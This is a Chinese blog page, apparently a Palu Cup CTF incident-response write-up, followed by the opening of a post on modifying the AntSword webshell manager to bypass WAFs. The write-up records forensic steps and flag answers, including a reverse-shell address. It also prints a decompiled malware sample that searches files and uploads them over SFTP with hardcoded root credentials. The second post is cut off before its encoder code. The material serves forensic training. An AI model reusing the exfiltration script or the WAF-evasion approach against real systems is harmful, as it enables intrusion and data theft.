src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422111019091.png" alt="image-20240422111019091"></p><p>jump里面也有</p><blockquote><p>flag:nidewen.php</p></blockquote><h2 id="应急响应-24"><a href="#应急响应-24" class="headerlink" title="应急响应-24"></a>应急响应-24</h2><p><strong>题目要求：</strong><br>提交冰蝎的链接密码。</p><hr><p><strong>提交格式：</strong><br>[xxx]</p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422111427463.png" alt="image-20240422111427463"></p><p>直接让我的好大哥口算一下,就是文件名</p><blockquote><p>flag:nidewen</p></blockquote><h2 id="应急响应-25"><a href="#应急响应-25" class="headerlink" title="应急响应-25"></a>应急响应-25</h2><p><strong>题目要求：</strong><br>提交办公区存在的恶意用户名。</p><hr><p><strong>提交格式：</strong><br>[xxx]</p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422142549715.png" alt="image-20240422142549715"></p><p>上来就可以看到，</p><blockquote><p>flag:hacker</p></blockquote><h2 id="应急响应-26"><a href="#应急响应-26" class="headerlink" title="应急响应-26"></a>应急响应-26</h2><p><strong>题目要求：</strong><br>提交恶意用户密码到期时间。</p><hr><p><strong>提交格式：</strong><br>[2024/xxx/xxx/xxx:xxx:xxx]</p><p>进去输入net user hacker即可</p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240419144854185.png" alt="image-20240419144854185"></p><blockquote><p>flag: 2024/15/18/21:40:37</p></blockquote><h2 id="应急响应-27"><a href="#应急响应-27" class="headerlink" title="应急响应-27"></a>应急响应-27</h2><p><strong>题目要求：</strong><br>请对办公区留存的镜像取证并指出内存疑似恶意进程。</p><hr><p><strong>提交格式：</strong><br>[xxxx]</p><p><code>python2 vol.py -f /root/Desktop/raw.raw --profile=Win7SP1x64 pslist</code><br><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422142930126.png" alt="image-20240422142930126"></p><blockquote><p>.hack.ex</p></blockquote><h2 id="应急响应-28"><a href="#应急响应-28" class="headerlink" title="应急响应-28"></a>应急响应-28</h2><p><strong>题目要求：</strong><br>请指出该员工使用的公司OA平台的密码。</p><hr><p><strong>提交格式：</strong><br>[xxxx]</p><p>查一下pass相关file</p><p><code>python2 vol.py -f /root/Desktop/raw.raw --profile=Win7SP1x64 filescan | grep pass</code><br><code>python2 vol.py -f /root/Desktop/raw.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000003e296f20 -D /root/Desktop/</code></p><p>两个文件，提出来<br><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422143146132.png" alt="image-20240422143146132"></p><p>┌──(root㉿bohemian)-[~/Desktop]<br>└─# cat file.None.0xfffffa800ee5d530.dat<br>url: <a href="http://test.oa.com/login.html">http://test.oa.com/login.html</a><br>username: liuling<br>password: liuling7541  </p><blockquote><p>flag:  liuling7541  </p></blockquote><h2 id="应急响应-29"><a href="#应急响应-29" class="headerlink" title="应急响应-29"></a>应急响应-29</h2><p><strong>题目要求：</strong><br>攻击者传入一个木马文件并做了权限维持，请问木马文件名是什么。</p><hr><p><strong>提交格式：</strong><br>[xxxx]</p><p>抄的，不会，搜剪切板有<br>python2 vol.py -f /root/Desktop/raw.raw –profile=Win7SP1x64 clipboard<br>Volatility Foundation Volatility Framework 2.6.1<br>Session    WindowStation Format                         Handle Object             Data</p><hr><pre><code>     1 WinSta0       CF_UNICODETEXT               0x4c0397 0xfffff900c1c19c30 C:\Windows\PLA\h4ck3d!     1 WinSta0       CF_TEXT                          0x10 ------------------     1 WinSta0       0x1b01a5L              0x300000000000 ------------------     1 WinSta0       CF_TEXT                           0x1 ------------------     1 ------------- ------------------           0x1b01a5 0xfffff900c1cb2b60</code></pre><blockquote><p>flag:h4ck3d!</p></blockquote><h2 id="应急响应-30"><a href="#应急响应-30" class="headerlink" title="应急响应-30"></a>应急响应-30</h2><p><strong>题目要求：</strong><br>请提交该计算机中记录的重要联系人的家庭住址。</p><hr><p><strong>提交格式：</strong><br>[xxxxx]</p><p>抄的，第一次知道</p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422145239118.png" alt="image-20240422145239118"></p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422145259333.png" alt="image-20240422145259333"></p><p>那么提取，<br><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422145505782.png" alt="image-20240422145505782"></p><p>─# cat /root/Deskt941e0f06”&gt;&lt;c:Street&gt;秋水省雁荡市碧波区千屿山庄1号&lt;/c:Stree</p><blockquote><p>flag:秋水省雁荡市碧波区千屿山庄1号</p></blockquote><h2 id="应急响应-31"><a href="#应急响应-31" class="headerlink" title="应急响应-31"></a>应急响应-31</h2><p><strong>题目要求：</strong><br>请提交近源靶机上的恶意文件哈希。</p><hr><p><strong>提交格式：</strong><br>[xxx]</p><p>近源靶机为pc2,上面有个恶意文件，打开就是<br>PS C:\Users\Administrator\Desktop\artifact&gt; certutil -hashfile .\artifact.exe md5<br>MD5 的 .\artifact.exe 哈希:<br>a7fcd0b15a080167c4c2f05063802a6e<br>CertUtil: -hashfile 命令成功完成。<br>PS C:\Users\Administrator\Desktop\artifact&gt;</p><blockquote><p>flag a7fcd0b15a080167c4c2f05063802a6e</p></blockquote><h2 id="应急响应-32"><a href="#应急响应-32" class="headerlink" title="应急响应-32"></a>应急响应-32</h2><p><strong>题目要求：</strong><br>提交恶意程序的外联地址。</p><hr><p><strong>提交格式：</strong><br>[xxxxx]</p><p>这个拖到微步，没有检测到外连</p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422151054884.png" alt="image-20240422151054884"><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422151302325.png" alt="image-20240422151302325"></p><p>vt可以</p><blockquote><p>flag 101.78.63.44</p></blockquote><h2 id="应急响应-33"><a href="#应急响应-33" class="headerlink" title="应急响应-33"></a>应急响应-33</h2><p><strong>题目要求：</strong><br>提交攻击者使用内网扫描工具的哈希。</p><hr><p><strong>提交格式：</strong><br>[xxxx]</p><p>吐槽一下，这到了pc，然后又回到了服务器，有点蒙圈</p><p>root@debian:/usr/bin# md5sum fscan<br>1facdcd05c43ba4d37274dffc90b6d4e  fscan</p><blockquote><p>1facdcd05c43ba4d37274dffc90b6d4e  </p></blockquote><h2 id="应急响应-34"><a href="#应急响应-34" class="headerlink" title="应急响应-34"></a>应急响应-34</h2><p><strong>题目要求：</strong><br>请提交攻击者在站点上留下的后门密码。</p><hr><p><strong>提交格式：</strong><br>[md5(xxxx)]</p><p>后门的话，在index.php中，<br>waf中可看到执行了命令</p><blockquote><p>flag 123</p></blockquote><h2 id="应急响应-35"><a href="#应急响应-35" class="headerlink" title="应急响应-35"></a>应急响应-35</h2><p><strong>题目要求：</strong><br>请提交攻击者在数据库留下的信息。</p><hr><p><strong>提交格式：</strong><br>[xxxx]</p><p>还是直接用navicat连数据库比较好，命令行能翻一年<br>MySQL [ultrax]&gt; select * from pre_ucenter_vars;<br>+—————–+——-+<br>| name            | value |<br>+—————–+——-+<br>| flag{hack_palu} | 0     |<br>| noteexists      | 0     |<br>| noteexists1     | 0     |<br>+—————–+——-+<br>3 rows in set (0.001 sec)</p><p>MySQL [ultrax]&gt; </p><blockquote><p>flag{hack_palu} </p></blockquote><h2 id="应急响应-36"><a href="#应急响应-36" class="headerlink" title="应急响应-36"></a>应急响应-36</h2><p><strong>题目要求：</strong><br>提交攻击者在监控服务器上留下的dcnlog地址。</p><hr><p><strong>提交格式：</strong><br>[xxx.xx.xx]</p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422160601984.png" alt="image-20240422160601984"></p><p>进入到zabbix的数据库，也就是数据库2，可以查到passwd查一下为原密码</p><p>Admin/zabbix<br><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422161004820.png" alt="image-20240422161004820"></p><p>在脚本中有地址</p><blockquote><p>palu.dcnlog.cn</p></blockquote><h2 id="应急响应-37"><a href="#应急响应-37" class="headerlink" title="应急响应-37"></a>应急响应-37</h2><p><strong>题目要求：</strong><br>提交监控服务器上恶意用户的上一次登录时间。</p><hr><p><strong>提交格式：</strong><br>[xx/xx/xx/xx:xx:xx]</p><p>用户中有这个登录记录</p><p>不 (2024-04-17 01:32:44)</p><blockquote><p>2024-04-17 01:32:44</p></blockquote><h2 id="应急响应-38"><a href="#应急响应-38" class="headerlink" title="应急响应-38"></a>应急响应-38</h2><p><strong>题目要求：</strong><br>提交监控服务器上遗留的反弹shell地址和端口。</p><hr><p><strong>提交格式：</strong><br>[xxxx:xx]</p><p>解一下base64即可</p><blockquote><p>154.183.110.12:7890</p></blockquote><h2 id="应急响应-39"><a href="#应急响应-39" class="headerlink" title="应急响应-39"></a>应急响应-39</h2><p><strong>题目要求：</strong><br>提交恶意钓鱼文件的哈希。</p><hr><p><strong>提交格式：</strong><br>[xxxx]</p><p>pc2上有一个docx文件，应该是用了调用的</p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422162222877.png" alt="image-20240422162222877"></p><h2 id="应急响应-40"><a href="#应急响应-40" class="headerlink" title="应急响应-40"></a>应急响应-40</h2><p><strong>题目要求：</strong><br>提交恶意文件外连IP。</p><hr><p><strong>提交格式：</strong><br>[xxx]</p><h2 id="应急响应-41"><a href="#应急响应-41" class="headerlink" title="应急响应-41"></a>应急响应-41</h2><p><strong>题目要求：</strong><br>提交被恶意文件钓鱼使用者的姓名。</p><hr><p><strong>提交格式：</strong><br>[xxx]</p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422162758559.png" alt="image-20240422162758559"></p><h2 id="应急响应-42"><a href="#应急响应-42" class="headerlink" title="应急响应-42"></a>应急响应-42</h2><p><strong>题目要求：</strong><br>提交攻击者留下的信息。</p><hr><p><strong>提交格式：</strong><br>[xxxx]</p><p>z这里，我们找到jumpserver的录像，我第一次知道这东西还有录像功能<br>首先到jump的目录找到config.txt</p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422172534548.png" alt="image-20240422172534548"></p><p>看到录像的位置</p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422172559581.png" alt="image-20240422172559581"></p><p>然后上这里照录象</p><p>/data/jumpserver/core/data/media/replay</p><p>录像很多，要筛选一下，我们猜测大概在4.16-17进行的渗透<br><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422172751520.png" alt="image-20240422172751520"></p><p>在4.17有很多录像，这里注意cast的是linux录像</p><p>replay是win录像<br>找到这个打的，9.3m的导出来<br><code>https://player.glyptodon.com/</code></p><p>在这个网站打开，文件，看到5：11左右，可以看到写了个注册表</p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422172131659.png" alt="image-20240422172131659"></p><blockquote><p>flag:flag{2024-04-17-hi}</p></blockquote><h2 id="应急响应-43"><a href="#应急响应-43" class="headerlink" title="应急响应-43"></a>应急响应-43</h2><p><strong>题目要求：</strong><br>提交恶意用户数量。</p><hr><p><strong>提交格式：</strong><br>[md5(xxxx)]</p><p>理论上来说，那些用户名都不算，是用户名<br>而admin这些是用户，不理解<br>那一共是49个</p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422173631566.png" alt="image-20240422173631566"></p><blockquote><p>flag:49</p></blockquote><h2 id="应急响应-44"><a href="#应急响应-44" class="headerlink" title="应急响应-44"></a>应急响应-44</h2><p><strong>题目要求：</strong><br>请提交员工集体使用的密码。</p><hr><p><strong>提交格式：</strong><br>[xxxx]</p><p>在15：02的时候，可以看到设置了密码</p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422173847516.png" alt="image-20240422173847516"></p><blockquote><p>Network@2020</p></blockquote><h2 id="应急响应-45"><a href="#应急响应-45" class="headerlink" title="应急响应-45"></a>应急响应-45</h2><p><strong>题目要求：</strong><br>提交加密文件的哈希。</p><hr><p><strong>提交格式：</strong><br>[xxxx]</p><p>加密文件就是encode。txt<br>hash一下</p><p>PS C:\Users\Administrator\Documents&gt; certutil -hashfile .\encode.txt md5<br>MD5 的 .\encode.txt 哈希:<br>dc040203e9122e89ee44ddc85058795a<br>CertUtil: -hashfile 命令成功完成。<br>PS C:\Users\Administrator\Documents&gt;</p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422174044841.png" alt="image-20240422174044841"></p><blockquote><p>dc040203e9122e89ee44ddc85058795a</p></blockquote><h2 id="应急响应-46"><a href="#应急响应-46" class="headerlink" title="应急响应-46"></a>应急响应-46</h2><p><strong>题目要求：</strong><br>提交被攻击者加密的内容明文。</p><hr><p><strong>提交格式：</strong><br>[xxxx]</p><p><a href="https://www.ddosi.org/drt-aav/">https://www.ddosi.org/drt-aav/</a></p><p>这个网站给了码表，对一下就行</p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422174049892.png" alt="image-20240422174049892"></p><blockquote><p>flag:2024ispassword</p></blockquote><h2 id="应急响应-47"><a href="#应急响应-47" class="headerlink" title="应急响应-47"></a>应急响应-47</h2><p><strong>题目要求：</strong><br>请提交符合基线标准的服务器数量。</p><hr><p><strong>提交格式：</strong><br>[md5(xx)]</p><p>不懂，我看zabbix上就一台机器<br>webserver</p><blockquote><p>0</p></blockquote><h2 id="应急响应-48"><a href="#应急响应-48" class="headerlink" title="应急响应-48"></a>应急响应-48</h2><p><strong>题目要求：</strong><br>提交办公区的恶意文件哈希。</p><hr><p><strong>提交格式：</strong><br>[xxx]</p><p>在jump上面可以看到4、17上传了一个文件，但是桌面上我们并没有看到，可能就是恶意文件了</p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240423084615143.png" alt="image-20240423084615143"></p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240423084729345.png" alt="image-20240423084729345"></p><p>搜一下，看起来是个python的文件</p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240423084858362.png" alt="image-20240423084858362"></p><blockquote><p>5232a191eb2913337e0a93b0a990f2a2</p></blockquote><h2 id="应急响应-49"><a href="#应急响应-49" class="headerlink" title="应急响应-49"></a>应急响应-49</h2><p><strong>题目要求：</strong><br>提交恶意回连端口。</p><hr><p><strong>提交格式：</strong><br>[xxx]</p><p>简单py逆向了</p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240423085055511.png" alt="image-20240423085055511"></p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240423085236855.png" alt="image-20240423085236855"></p><p>讲pyc到网站解一下就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit https://tool.lu/pyc/ for more information</span></span><br><span class="line"><span class="comment"># Version: Python 3.8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"><span class="keyword">from</span> getpass <span class="keyword">import</span> getpass</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search_in_files</span>(<span class="params">directory, search_text</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="comment"># WARNING: Decompyle incomplete</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ssh</span>(<span class="params">local_file_path, remote_file_path</span>):</span></span><br><span class="line">    hostname = <span class="string">&#x27;192.168.20.123&#x27;</span></span><br><span class="line">    port = <span class="number">22</span></span><br><span class="line">    username = <span class="string">&#x27;root&#x27;</span></span><br><span class="line">    password = <span class="string">&#x27;Network@2020&#x27;</span></span><br><span class="line">    client = paramiko.SSHClient()</span><br><span class="line">    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class="line">    client.connect(hostname, port, username, password)</span><br><span class="line">    sftp = client.open_sftp()</span><br><span class="line">    sftp.put(local_file_path, remote_file_path)</span><br><span class="line">    sftp.close()</span><br><span class="line">    client.close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;&#x27;&#x27;File <span class="subst">&#123;local_file_path&#125;</span> uploaded to <span class="subst">&#123;remote_file_path&#125;</span> on <span class="subst">&#123;hostname&#125;</span>&#x27;&#x27;&#x27;</span>)</span><br><span class="line">    flag = <span class="string">&#x27;flag&#123;234567uyhgn_aiduyai&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">search_directory = <span class="string">&#x27;/&#x27;</span></span><br><span class="line">search_for_text = <span class="string">&#x27;passwod&#x27;</span></span><br><span class="line">(a, b) = search_in_files(search_directory, search_for_text)</span><br><span class="line">ssh(a, b)</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>22</p></blockquote><h2 id="应急响应-50"><a href="#应急响应-50" class="headerlink" title="应急响应-50"></a>应急响应-50</h2><p><strong>题目要求：</strong><br>提交恶意程序中的flag。</p><hr><p><strong>提交格式：</strong><br>[xxx]</p><blockquote><p> flag{234567uyhgn_aiduyai}</p></blockquote><h2 id="应急响应-51"><a href="#应急响应-51" class="headerlink" title="应急响应-51"></a>应急响应-51</h2><p><strong>题目要求：</strong><br>提交恶意文件中的search_for_text内容。</p><hr><p><strong>提交格式：</strong><br>[xxxx]</p><blockquote><p>passwod</p></blockquote><h2 id="应急响应-52"><a href="#应急响应-52" class="headerlink" title="应急响应-52"></a>应急响应-52</h2><p><strong>题目要求：</strong><br>提交web服务器上攻击者修改后的root密码。</p><hr><p><strong>提交格式：</strong><br>[xxxx]</p><p>就是上面py里的密码</p><blockquote><p> Network@2020</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>antsword-bypasswaf</title>
      <link href="/2024/02/28/antsword-bypasswaf/antsword-bypasswaf/"/>
      <url>/2024/02/28/antsword-bypasswaf/antsword-bypasswaf/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/antsword-bypasswaf/image-20240301085541693.png" alt="image-20240301085541693"></p><h4 id="antsword-php改造"><a href="#antsword-php改造" class="headerlink" title="antsword-php改造"></a>antsword-php改造</h4><h5 id="1-前置知识"><a href="#1-前置知识" class="headerlink" title="1.前置知识"></a>1.前置知识</h5><p>这里笔者不在讲解antsword的功能等等了，这里直接看一下蚁剑的核心文件。</p><p><img src="/images/antsword-bypasswaf/image-20240301090748514.png" alt="image-20240301090748514"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"># $ tree -l 1 -d ./</span><br><span class="line">── base</span><br><span class="line">├── core</span><br><span class="line">│   ├── asp</span><br><span class="line">│   │   ├── decoder</span><br><span class="line">│   │   ├── encoder</span><br><span class="line">│   │   └── template</span><br><span class="line">│   │       └── database</span><br><span class="line">│   ├── aspx</span><br><span class="line">│   │   ├── decoder</span><br><span class="line">│   │   ├── encoder</span><br><span class="line">│   │   └── template</span><br><span class="line">│   │       └── database</span><br><span class="line">│   ├── custom</span><br><span class="line">│   │   ├── decoder</span><br><span class="line">│   │   ├── encoder</span><br><span class="line">│   │   └── template</span><br><span class="line">│   │       └── database</span><br><span class="line">│   ├── php</span><br><span class="line">│   │   ├── decoder</span><br><span class="line">│   │   ├── encoder</span><br><span class="line">│   │   └── template</span><br><span class="line">│   │       └── database</span><br><span class="line">│   └── php4</span><br><span class="line">├── language</span><br><span class="line">├── modules</span><br><span class="line">│   ├── database</span><br><span class="line">│   │   ├── asp</span><br><span class="line">│   │   ├── aspx</span><br><span class="line">│   │   ├── custom</span><br><span class="line">│   │   └── php</span><br><span class="line">│   ├── filemanager</span><br><span class="line">│   ├── plugin</span><br><span class="line">│   ├── settings</span><br><span class="line">│   ├── shellmanager</span><br><span class="line">│   │   ├── category</span><br><span class="line">│   │   └── list</span><br><span class="line">│   ├── terminal</span><br><span class="line">│   └── viewsite</span><br><span class="line">└── ui</span><br><span class="line"></span><br><span class="line">core下面时核心代码，每种语言的的编码解码及操作等等，因为笔者对php比较熟悉，所以这里先对php的编解码进行编写</span><br></pre></td></tr></table></figure><p>core-&gt;php-&gt;index.js是<em>PHP服务端脚本模板</em><br>其中关键代码在100行左右，为当我们与服务端进行通信时所传递的代码<br><img src="/images/antsword-bypasswaf/image-20240301091117143.png" alt="image-20240301091117143"></p><p>126行也是，这个data[‘_’]就是我们在将数据发送给服务端的模板，相信大家已经看到了<br>``@ini_set(“display_errors”, “0”，`经典开头</p><p><img src="/images/antsword-bypasswaf/image-20240301091144060.png" alt="image-20240301091144060"></p><p>在传输中的样子</p><p><img src="/images/antsword-bypasswaf/image-20240301091543492.png" alt="image-20240301091543492"></p><h5 id="2-php下的文件大致介绍"><a href="#2-php下的文件大致介绍" class="headerlink" title="2.php下的文件大致介绍"></a>2.php下的文件大致介绍</h5><h6 id="2-1php下的文件大致介绍"><a href="#2-1php下的文件大致介绍" class="headerlink" title="2.1php下的文件大致介绍"></a>2.1php下的文件大致介绍</h6><p>php文件夹下有三个文件夹，其中template下面是数据库操作的代码，有很多，我们看一个</p><p><img src="/images/antsword-bypasswaf/image-20240301091749865.png" alt="image-20240301091749865"></p><p>这里为<em>数据库管理模板::mssql</em>的文件，可以看到本质核心使用php语言写的，<br>$T=@mssql_connect($hst,$usr,$pwd);用于连接数据库<br>$q=@mssql_query(“select [name] from master.dbo.sysdatabases order by 1”,$T);查库</p><p><img src="/images/antsword-bypasswaf/image-20240301092036379.png" alt="image-20240301092036379"></p><p><em>数据库管理模板::mysql</em> 一样的操作，不过不同的数据库语法不同。其他的不在一一列举</p><p><img src="/images/antsword-bypasswaf/image-20240301092219954.png" alt="image-20240301092219954"></p><h6 id="2-2decoder和encoder"><a href="#2-2decoder和encoder" class="headerlink" title="2.2decoder和encoder"></a>2.2decoder和encoder</h6><p><img src="/images/antsword-bypasswaf/image-20240301093308427.png" alt="image-20240301093308427"></p><p>在当前两个文件夹中，都是蚁剑默认自带的编码器和解码器，如果想找我们自己新建的，应该去<code>antData-&gt;php-&gt;decoder或者encoder</code></p><p><img src="/images/antsword-bypasswaf/image-20240301093612786.png"></p><p>不同的语言对应不同的编码解码器文件，模块化。</p><h5 id="3-编码器与解码器"><a href="#3-编码器与解码器" class="headerlink" 